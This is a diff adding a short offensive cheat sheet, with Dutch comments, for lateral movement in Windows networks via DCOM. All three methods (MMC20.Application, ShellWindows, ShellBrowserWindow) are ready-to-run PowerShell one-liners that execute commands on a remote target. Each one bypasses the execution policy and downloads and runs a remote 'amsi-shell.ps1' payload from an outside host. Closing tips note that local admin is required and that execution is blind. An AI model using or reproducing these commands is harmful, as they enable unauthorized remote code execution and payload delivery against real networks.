@@ -1,0 +1,9 @@
+# Lateral Movement via DCOM (Distributed COM)
+# Methode 1: MMC20.Application (meest gebruikt)
+powershell -c "$com=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'));$com.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')','7')"
+# Methode 2: ShellWindows
+powershell -c "$com=[activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','TARGET'));$item=$com.Item();$item.Document.Application.ShellExecute('cmd.exe','/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')','C:\Windows\tasks','',0)"
+# Methode 3: ShellBrowserWindow
+powershell -c "$com=[activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880','TARGET'));$com.Document.Application.ShellExecute('powershell','-ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')','C:\Windows\tasks','',0)"
+# Tip: Vereist local admin op target + DCOM poorten (135 + dynamisch)
+# Tip: Blind execution - geen output terug
